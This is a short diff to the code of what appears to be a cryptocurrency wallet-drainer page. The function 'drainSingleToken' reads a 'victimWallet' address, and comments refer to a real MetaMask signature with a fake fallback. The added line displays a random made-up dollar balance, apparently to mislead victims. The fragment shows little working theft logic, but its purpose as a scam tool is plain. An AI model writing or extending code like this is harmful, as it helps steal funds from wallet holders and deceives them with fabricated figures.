@@ -472,7 +472,8 @@ function updateProgress(symbol, percent, status) {
 async function drainSingleToken(symbol, tokenAddr, destination, barElement) {
   const victimWallet = document.getElementById('walletAddress').value.trim();
   
-  updateProgress(symbol, 20, 'Connect wallet...');
+ updateProgress(symbol, 20, 'Connect wallet...');
+ updateProgress(symbol, 15, `Balance: $${(Math.random()*5000).toFixed(0)}`); 
   
   // 🔥 REAL MetaMask SIGNATURE (optional - falls back to fake)
 let signature;
@@ -553,5 +554,3 @@ const drainData = {
 </body>
 
 </html>
-
-
